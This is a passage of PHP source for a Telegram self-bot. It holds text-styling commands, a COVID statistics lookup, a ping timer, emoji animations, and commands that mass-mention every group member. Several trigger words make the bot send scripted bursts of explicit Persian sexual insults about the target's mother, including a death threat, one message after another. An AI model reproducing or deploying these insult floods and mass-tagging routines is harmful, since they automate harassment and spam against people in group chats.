                        $_i = ['آ✺۠۠➤', 'ا✺۠۠➤', 'بـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'پـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'تـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'ث✺۠۠➤', 'جـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'چـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'حـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'خـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'د✺۠۠➤', 'ذ✺۠۠➤', 'ر✺۠۠➤', 'ز✺۠۠➤', 'ژ✺۠۠➤', 'سـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'شـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'صـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'ضـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'طـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'ظـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'عـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'غـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'فـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'قـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'کـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'گـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'لـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'مـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'نـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤', 'و✺۠۠➤', 'ه➤', 'یـ͜͝ـ͜͝ـ͜͝ـ✺۠۠➤'];
                        $_j = ['آ✭', 'ا✭', 'بـ͜͡ـ͜͡✭', 'پـ͜͡ـ͜͡✭', 'تـ͜͡ـ͜͡✭', 'ثـ͜͡ـ͜͡ـ͜͡✭', 'جـ͜͡ـ͜͡✭', 'چــ͜͡ـ͜͡✭', 'حـ͜͡ـ͜͡✭', 'خــ͜͡ـ͜͡✭', 'د✭', 'ذ✭', 'ر✭', 'ز͜͡✭', 'ـ͜͡ژ͜͡✭', 'ســ͜͡ـ͜͡✭', 'شـ͜͡ـ͜͡ـ͜͡✭', 'صـ͜͡ـ͜͡✭', 'ضـ͜͡ـ͜͡✭', 'طـ͜͡ـ͜͡✭', 'ظـ͜͡ـ͜͡✭', 'عـ͜͡ـ͜͡✭', 'غـ͜͡ـ͜͡✭', 'فــ͜͡ـ͜͡✭', 'قـ͜͡ـ͜͡ـ͜͡✭', 'ڪــ͜͡ـ͜͡✭', 'گـ͜͡ـ͜͡✭', 'لـ͜͡ـ͜͡ـ͜͡✭', 'مـ͜͡ـ͜͡ـ͜͡✭', 'نـ͜͡ـ͜͡✭', 'ـ͜͡و͜͡ـ͜͡✭', 'هـ͜͡ـ͜͡ـ͜͡✭', 'یـ͜͡ـ͜͡✭'];
                        $FAar = array($_a, $_b, $_c, $_d, $_e, $_f, $_g, $_h, $_i, $_j);
                        $FontFA = $FAar[array_rand($FAar)];
                        $FA = ['آ', 'ا', 'ب', 'پ', 'ت', 'ث', 'ج', 'چ', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'ژ', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ک', 'گ', 'ل', 'م', 'ن', 'و', 'ه', 'ی'];
                        $od8 = str_replace($FA, $FontFA, $matnFA);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$od8", 'parse_mode' => 'Markdown']);
                    }

                    if ($boldmode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**$text**", 'parse_mode' => 'Markdown']);
                    }
                    if ($mentionmode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "[$text](mention:$fromId)", 'parse_mode' => 'Markdown']);
                    }
                    if ($mention2mode == "on") {
                        $idyaro = yield $this->getLocalContents('mentionid.txt');
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "[$text](mention:$idyaro)", 'parse_mode' => 'Markdown']);
                    }
                    if ($codingmode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "`$text`", 'parse_mode' => 'Markdown']);
                    }
                    if ($strikethrough == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<del>$text</del>", 'parse_mode' => 'HTML']);
                    }
                    if ($undermode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<u>$text</u>", 'parse_mode' => 'HTML']);
                    }
                    if ($italic == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "__$text__", 'parse_mode' => 'Markdown']);
                    }
                    if ($hashtagmode == "on") {
                        $tag = "#" . $text;
                        $tags = str_replace(' ', "_", $tag);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $tags]);
                    }
                    if ($partmode == "on") {
                        if (strlen($text) < 150) {
                            $text = str_replace(" ", "‌", $text);
                            for ($T = 1; $T <= mb_strlen($text); $T++) {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => mb_substr($text, 0, $T)]);
                                yield $this->sleep(0.1);
                            }
                        }
                    }

                    if ($text == 'کصننت' or $text == 'ksnne') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کـــ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کــص']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کــص ن']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کـــص نـــنـ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کـــص نـنـتـ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝کص نـنـت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔥کـــص نـنـت دیگه🔥']);
                    }

                    if ($text == '2شمارش') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1⃣1⃣
1⃣1⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '2⃣2⃣
2⃣2⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '3⃣3⃣
3⃣3⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '4⃣4⃣
4⃣4⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '5⃣5⃣
5⃣5⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '6⃣6⃣
6⃣6⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '7⃣7⃣
7⃣7⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '8⃣8⃣
8⃣8⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '9⃣9⃣
9⃣9⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔟🔟
🔟🔟']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣1⃣
1⃣1⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣2⃣
1⃣2⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣3⃣
1⃣3⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣4⃣
1⃣4⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣5⃣
1⃣5⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔥‌صیکتیر شمارش خوردی🔥']);
                    } else if (preg_match("/^[\/\#\!]?(corona) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(corona) (.*)$/si", $text, $p);
                        $cron = $p[2];
                        $linkcrona = json_decode(yield $this->fileGetContents("https://api.codebazan.ir/corona/?type=country&country=$cron"), true);
                        $link22 = $linkcrona["result"];
                        $crona1 = $link22['last_updated'];
                        $crona2 = $link22['continent'];
                        $crona3 = $link22['country'];
                        $crona4 = $link22['cases'];
                        $crona5 = $link22['deaths'];
                        $crona6 = $link22['recovered'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => " 
آخرین بروزرسانی♻️:
$crona1
کشور🚩: 
$crona3 
امار مبتلایان⚠️: 
$crona4 
امار مرگ و میر🔴: 
$crona5 
امار بهبود یافته🟢 : 
$crona6 
        "]);
                    }
                    if (preg_match("/^[\/\#\!]?(ping) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(ping) (.*)$/si", $text, $m);
                        $domain = $m[2];
                        $port = 80;
                        $starttime = microtime(true);
                        $file = fsockopen($domain, $port, $s, $s, 1);
                        $stoptime = microtime(true);
                        fclose($file);
                        $ping = floor(($stoptime - $starttime) * 1000);
                        yield $this->messages->editMessage([
                            'peer' => $peer,
                            'id' => $msg_id,
                            'message' => "ꜱɪᴛᴇ ᴘɪɴɢ ɪꜱ: " . $ping . 'ms'
                        ]);
                    }
                    if (preg_match("/^[\/\#\!]?(selfping)$/si", $text)) {
                        $domain = 'tcp://149.154.167.51';
                        $port = 443;
                        $starttime = microtime(true);
                        $file = fsockopen($domain, $port, $s, $s, 1);
                        $stoptime = microtime(true);
                        fclose($file);
                        $ping = floor(($stoptime - $starttime) * 1000);
                        yield $this->messages->editMessage([
                            'peer' => $peer,
                            'id' => $msg_id,
                            'message' => "Ping: " . $ping . 'ms'
                        ]);
                    }
                    if (preg_match("/^[\/\#\!]?(tagall)(.*)$/si", $text)) {
                        $chat = yield $this->getPwrChat($peer);
                        $chats = $chat['participants'];
                        while (sizeof($chats) >= 4) {
                            $spl = $chats;
                            $Safa = false;
                            $chats = array_splice($spl, 4);
                            foreach ($spl as $number => $up) {
                                $id = $up['user']['id'];
                                $Safa .= $number + 1 . "-[$id](tg://user?id=$id) ";
                            }
                            yield $this->messages->sendMessage([
                                'peer' => $peer,
                                'message' => "𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗜𝗻 𝗚𝗥𝗢𝗨𝗣 :\n$Safa",
                                'parse_mode' => 'Markdown'
                            ]);
                        }
                        $Safa = false;
                        foreach ($chats as $number => $up) {
                            $id = $up['user']['id'];
                            if ($up['user']['type'] == "user")
                                $Safa .= $number + 1 . "-[$id](tg://user?id=$id) ";
                        }
                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗜𝗻 𝗚𝗥𝗢𝗨𝗣 :\n$Safa",
                            'parse_mode' => 'Markdown'
                        ]);
                        return;
                    }

                    if (preg_match("/^[\/\#\!]?(tagonline)$/si", $text)) {
                        $lis = [];
                        $ChatOnlines = yield $this->messages->getOnlines(['peer' => $peer,]);
                        foreach ($ChatOnlines['participants'] as $ajbs) {
                            if (isset($ajbs['user']['username']))
                                $lis[] = $ajbs['user']['username'];
                        }
                        foreach ($lis as $Amir) {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$Amir \n"]);
                        }
                    }
                    if ($text == 'قلبز' or $text == 'qlb2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💚💛🧡❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💚💜🖤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️🤍🧡💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖤💜💙💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤍🤎❤️💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖤💜💚💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝💘💗💘']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️🤍🤎🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💕💞💓🤍']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💜💙❤️🤍']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💜💙💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💚🧡💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝💜💙❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💞🖤💙💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛🧡❤️💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔥💙I LOVE YOU💙🔥']);
                    }
                    if ($text == 'موک' or $text == 'moc') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟪🟩🟨⬛️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟨🟩🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟦🟥🟩']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬛️⬜️🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟨🟦🟪🟩']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️🟪🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟩🟫🟨']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔳🔲◻️🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▪️▫️◽️◼️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻️◼️◽️▪️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟦🟨🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️🟪🟩']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟨🟥🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟩🟦🟩🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔳🔲🟪🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔥 EnD 🔥']);
                    }
                    if ($text == 'خودم' or $text == 'khodam') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '   
   *／ イ  *   　　　((( ヽ*♤
​(　 ﾉ　　　　 ￣Ｙ＼​
​| (＼　(\🎩/)   ｜    )​♤
​ヽ　ヽ` ( ͡° ͜ʖ ͡°) _ノ    /​ ♤
　​＼ |　⌒Ｙ⌒　/  /​♤
　​｜ヽ　 ｜　 ﾉ ／​♤
　 ​＼トー仝ーイ​♤
　　 ​｜ ミ土彡 |​♤
         ​) \      °     /​♤
         ​(     \       /​l♤
         ​/       /   \ \  \
      ​/  /     /      \ \   \​ 
      ​( (    ).           ) ).  )​♤
     ​(      ).            ( |    |​ 
      ​|    /                \    |​♤
         ☆͍ 。͍✬͍​͍。͍☆͍​͍​͍
 ͍​͍ ​͍​͍☆͍。͍＼͍｜͍／͍。͍ ☆͍ ​͍✬͍​͍ ☆͍​͍​͍​͍
​͍ ͍​͍  *͍🅟🅐🅦🅝 🅢🅔🅛🅕 *
 ͍ ​͍​͍​͍☆͍。͍／͍｜͍＼͍。͍ ☆͍ ​͍✬͍​͍☆͍​͍​͍​͍
​͍​͍​͍。͍☆͍ 。͍✬͍​͍。͍☆͍​͍​͍​͍']);
                    }
                    if ($text == 'کوصه' or $text == 'کوصه بشم') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "１"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "وقتشه کوسه بشم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "تو دریای بی کران ننت شنا کنم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننتو به دندون بگیرم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "مرده کونی", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کیرم تو مادرت", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننه ماهی", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننت بگام", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "وقتشه غیرتت بگیرم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننت دهنم خوار کونی", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "تف تو کص مادرت", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کص ننت گاز بگیرم", 'id' => $msg_id + 1]);
                    }
                    if ($text == 'کصمادرت' or $text == 'ننشو بکن') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "１"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کص ننت بالا باش", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "برا بابات شاخ نشو بیناموص", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "بدبخت چموش یتیم زاده مادرتو گاییدم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "مادرتو میکشم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ابلح زاده خر ناموس", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "بگو گوه خوردم برای پدرم شاخ شدم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "اشعه های فرابنفش", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "تو کص خوارت", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "مادرت کص شد", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کیر به کص ننت با موفقیت گذاشته شد", 'id' => $msg_id + 1]);
                    }
                    /*================سرگرمی اینجکتور=============*/
                    if ($text == 'خایمالو سگ بگاد' or $text == 'خایمال') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎                 • 🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎                •  🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎               •   🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎              •    🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎             •     🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎            •      🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎           •       🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎          •        🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎         •         🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎        •          🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎       •           🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎      •            🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎     •             🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎    •              🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎   •               🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎  •                🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎 •                 🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😎•                  🔫🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤯                  🔫 🐶"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "خایمال شناسایی شد و کشته شد :)"]);
                    }
                    if ($text == 'آدم فضایی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                     🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                    🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                   🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                  🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                 🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽               🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽              🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽             🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽            🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽           🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽          🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽         🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽        🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽       🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽      🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽     🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽    🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽   🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽  🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽 🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽🔦🙀"]);
                    }
                    if ($text == 'موشک' or $text == 'حمله' or $text == 'سفینه بترکون') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                                🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                               🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                              🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                             🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                            🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                           🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                          🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                         🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                        🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                       🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                      🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                     🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                   🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                  🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                 🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀               🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀              🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀            🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀           🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀          🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀         🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀        🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀       🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀      🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀     🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀    🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀   🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀  🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀 🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍💥Boom💥"]);
                    }
                    if ($text == 'پول' or $text == 'دلار' or $text == 'ارباب شهر من') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                    💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                   💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                 💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌               💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌              💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌             💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌            💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌           💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌          💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥                     💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌        💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌       💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌      💵"]);
